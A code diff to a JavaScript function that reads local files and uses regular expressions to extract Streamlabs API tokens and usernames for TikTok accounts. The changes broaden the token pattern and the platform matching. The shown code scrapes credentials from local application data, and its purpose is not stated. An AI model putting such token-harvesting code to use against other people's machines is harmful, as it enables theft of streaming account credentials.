@@ -32,17 +32,22 @@ function readStreamlabsTokens() {
             content = fs.readFileSync(file, 'utf8').replace(/\u0000/g, '');
         } catch (e) { continue; }
 
-        const regex = /"apiToken":"([a-f0-9]{20,40})"/gi;
+        // ✅ Regex más flexible: acepta cualquier alfanumérico (antes solo hex)
+        const regex = /"apiToken":"([a-zA-Z0-9_-]{20,60})"/g;
         let match;
         while ((match = regex.exec(content)) !== null) {
             const apiToken = match[1];
             const rest = content.substring(
                 match.index,
-                Math.min(match.index + 1200, content.length)
+                Math.min(match.index + 2000, content.length) // ✅ Más contexto
             );
 
-            // Solo cuentas TikTok
-            if (!/"primaryPlatform":"tiktok"/.test(rest)) continue;
+            // ✅ Acepta variantes: "primaryPlatform" o "platform", con o sin espacios
+            const esTikTok =
+                /"primaryPlatform"\s*:\s*"tiktok"/i.test(rest) ||
+                /"platform"\s*:\s*"tiktok"/i.test(rest);
+
+            if (!esTikTok) continue;
 
             const userMatch = rest.match(/"username":"([a-zA-Z0-9_.-]{2,40})"/);
             const username = userMatch ? userMatch[1] : '(desconocido)';
